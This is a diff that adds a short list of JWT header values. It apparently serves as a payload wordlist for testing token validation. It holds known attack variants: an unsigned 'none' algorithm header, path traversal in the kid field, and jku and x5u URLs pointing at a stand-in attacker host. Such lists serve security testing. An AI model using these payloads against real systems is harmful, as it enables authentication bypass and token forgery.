@@ -1,0 +1,15 @@
+{"alg":"none","typ":"JWT"}
+{"alg":"HS256","typ":"JWT"}
+{"alg":"RS256","typ":"JWT"}
+{"alg":"HS256","kid":"test"}
+{"alg":"HS256","kid":"../../../dev/null"}
+{"alg":"HS256","kid":"file:///dev/null"}
+{"alg":"RS256","kid":"test"}
+{"alg":"RS256","kid":"../../../dev/null"}
+{"alg":"RS256","kid":"file:///dev/null"}
+{"alg":"HS256","jku":"http://attacker.com/jwks.json"}
+{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
+{"alg":"HS256","x5u":"http://attacker.com/x509"}
+{"alg":"RS256","x5u":"http://attacker.com/x509"}
+{"alg":"HS256","crit":["exp"]}
+{"alg":"RS256","crit":["exp"]}
